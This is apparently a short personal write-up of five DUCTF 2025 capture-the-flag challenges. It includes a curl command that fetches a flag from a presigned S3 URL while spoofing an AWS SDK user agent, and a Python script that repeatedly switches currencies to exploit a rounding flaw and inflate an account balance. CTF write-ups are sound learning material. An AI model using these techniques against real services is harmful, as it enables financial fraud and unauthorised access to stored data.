---
title: "ductfbank1"
description: "Our team got 14th place overall, and we'll go through the 6 challenges i was able to solve."
published: "2025-08-29"
updated: "2025-08-29"
event: "DUCTF"
category: "Reverse Engineering"
kind: "writeup"
status: "solved"
tags: ["Reverse Engineering", "DUCTF", "Writeup"]
readingTime: 1
wordCount: 196
featured: false
sourcePath: "~/ctf/writeups/(DUCTF) Writeups.md"
---

DUCTF Writeups
![ductf20251](https://hackmd.io/_uploads/rkRNjVCwle.png)

Our team got 14th place overall, and we'll go through the 6 challenges i was able to solve.
![ductf20252](https://hackmd.io/_uploads/Sy9Hj4APlg.png)

# ductfbank1
talk to the AI, make an account, get flag.
# kick the bucket
curl -A "aws-sdk-go/1.44.100 (go1.19; linux; amd64)" "https://kickme-95f596ff5b61453187fbc1c9faa3052e.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA…REDACTED%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250715T124755Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=6cefb6299d55fb9e2f97e8d34a64ad8243cdb833e7bdf92fc031d57e96818d9b"
<?xml version="1.0" encoding="UTF-8"?>
this was the command i used to bypass the error, unfortunately, as the time of writing this, the server has shutted down
# our-lonely-dog
challeng desc:
> Dear hajjilla,
> 
> e-dog has been alone in the downunderctf.com email server for so long, please yeet him an email of some of your pets to keep him company, he might even share his favourite toy with you.
> 
> He has a knack for hiding things one layer deeper than you would expect.
> 
> Regards,
> crem

by sending an email to e-dog, we get a response

![ductf20253](https://hackmd.io/_uploads/SknajN0wgx.png)

after checking the raw source of the email, we get our flag:
![ductf20254](https://hackmd.io/_uploads/HJO0j4Avgg.png)

# stonks
we get presented with a neuseating website, but by signing up for an account an exploiting the server request, by running this script and clicking on "see if im rich":
```python
import requests

url = "https://beginner-stonks-a0c8e158ea33.2025.ductf.net"
session = requests.Session()

# Login (replace with your credentials)
response = session.post(f"{url}/login", data={"username": "thinh", "password": "thinh"})
if "INCORRECT" in response.text:
    print("Login failed")
    exit()

# Alternate between IDR and GBP
currencies = ["IDR", "GBP"]
for i in range(1000):  # Adjust number of iterations
    currency = currencies[i % 2]
    response = session.post(f"{url}/change-currency", data={"currency": currency})
    print(f"Iteration {i+1}: Switched to {currency}")

# Check balance
response = session.get(f"{url}/")
balance = float(response.text.split("Your balance is: ")[1].split(" ")[0])  # Parse balance from HTML
print(f"Final balance: {balance}")

# Check if rich
response = session.get(f"{url}/are-you-rich")
print(response.text)
```

![ductf20255](https://hackmd.io/_uploads/HkGyhVRPex.png)

# zeus 
we are given a C program, and by reverse enginneering it, we find the correct input, triggering zeus to respond 

![ductf20256](https://hackmd.io/_uploads/SkJe3NCvex.png)

![ductf20257](https://hackmd.io/_uploads/S1se2ECDee.png)

---
written by hajjilla
